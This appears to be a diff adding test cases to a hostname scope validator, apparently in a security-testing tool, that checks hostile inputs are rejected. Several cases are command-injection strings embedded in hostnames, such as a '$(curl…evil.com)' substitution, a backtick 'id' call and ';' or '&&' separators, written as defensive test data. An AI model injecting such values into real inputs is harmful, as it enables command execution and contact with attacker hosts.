@@ -66,7 +66,22 @@ describe('checkScope verdicts', () => {
         ['a‍b.acme-test.com', 'invalid_target'],
         ['app.acme-test.com/a b', 'invalid_target'],
         ['', 'invalid_target'],
-        ['http://', 'invalid_target']
+        ['http://', 'invalid_target'],
+        ['$(curl${IFS}evil.com).acme-test.com', 'invalid_target'],
+        ['`id`.acme-test.com', 'invalid_target'],
+        ['evil.com;.acme-test.com', 'invalid_target'],
+        ['evil.com&&.acme-test.com', 'invalid_target'],
+        ['a{b,c}.acme-test.com', 'invalid_target'],
+        ['*.acme-test.com', 'invalid_target'],
+        ["a'b.acme-test.com", 'invalid_target'],
+        ['a=b!.acme-test.com', 'invalid_target'],
+        ['https://evil.com;.acme-test.com/x', 'invalid_target'],
+        ['＄(id).acme-test.com', 'invalid_target'],
+        ['-a.acme-test.com', 'invalid_target'],
+        ['_dmarc.acme-test.com', 'in_scope'],
+        ['a_b_.acme-test.com', 'in_scope'],
+        ['ａｐｐ.acme-test.com', 'in_scope'],
+        ['app。acme-test.com', 'in_scope']
     ])('%s -> %s', (input, verdict) => {
         expect(checkScope(acme, input, NOW).verdict).toBe(verdict)
     })
@@ -122,6 +137,19 @@ describe('checkScope verdicts', () => {
 
     it('pins the IPv6 target form', () => {
         expect(normalizeTarget('2001:DB8:0:0::1')).toBe('2001:db8::1')
+    })
+
+    it('accepts underscore and fullwidth config domains', () => {
+        const e = make({ scope: { domains: ['_srv.acme-test.com', '*._tcp.acme-test.com', 'ａ.acme-test.com'] } })
+        expect(e.scope.domains).toEqual(['_srv.acme-test.com', '*._tcp.acme-test.com', 'a.acme-test.com'])
+        expect(checkScope(e, '_srv.acme-test.com', NOW).verdict).toBe('in_scope')
+        expect(checkScope(e, 'x._tcp.acme-test.com', NOW).verdict).toBe('in_scope')
+    })
+
+    it('rejects non-hostname config domains', () => {
+        for (const d of ['a;b.test', '*.a$b.test', 'a*.test', '-a.test']) {
+            expect(() => make({ scope: { domains: [d] } })).toThrow(/scope\.domains/)
+        }
     })
 
     it('rejects IDNA deviation characters in config domains', () => {
